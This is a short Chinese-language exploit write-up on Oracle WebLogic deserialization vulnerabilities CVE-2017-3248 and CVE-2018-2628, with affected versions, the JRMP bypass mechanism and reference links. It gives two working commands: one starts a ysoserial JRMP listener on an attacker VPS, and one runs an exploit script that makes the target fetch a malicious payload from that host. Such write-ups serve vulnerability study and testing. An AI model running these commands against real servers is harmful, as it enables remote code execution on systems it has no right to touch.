# CVE-2017-3248&CVE-2018-2628 反序列化
影响版本:
```
Oracle WebLogic Server10.3.6.0
Oracle WebLogic Server12.2.1.2
Oracle WebLogic Server12.2.1.3
Oracle WebLogic Server12.1.3.0
```
## 原理
CVE-2017-3248该漏洞主要使用JRMP协议来绕过之前对T3协议的反序列化黑名单,首先通过T3协议发送反序列化payload使得目标成为一个JRMP客户端来连接我们监听的恶意JRMP服务端,然后客户端获取我们JRMP服务端发送的反序列化数据后会再次进行反序列化,从而造成二次反序列化RCE.
### JRMP模块利用流程 
1. 在vps上监听一个JRMP Server  
`java -cp ysoserial.jar  ysoserial.exploit.JRMPListener 9999 CommonsCollections1 "touch /tmp/test.txt" `
![](1.png)
2. 发送payload使目标成为一个JRMP客户端来加载JRMP Server上的远程恶意类.  
` python2 .\2018-2628.py 127.0.0.1 7001 ..\ysoserial.jar 192.168.126.129 9999 JRMPClient`
![](2.png)

#### CVE-2018-2628
而CVE-2018-2628为CVE-2017-3248黑名单修复的绕过,在CVE-2017-3248的补丁中,主要是在`resolveClass`中对`java.rmi.registry.Registry`接口进行了黑名单过滤,该漏洞则是使用了`java.rmi.activation.Activator`来替代`java.rmi.registry.Registry`接口进行远程加载从而绕过了黑名单.

**参考**  
https://xz.aliyun.com/t/8073#toc-0  
https://xz.aliyun.com/t/10171#toc-0  
http://xxlegend.com/2018/06/20/  CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/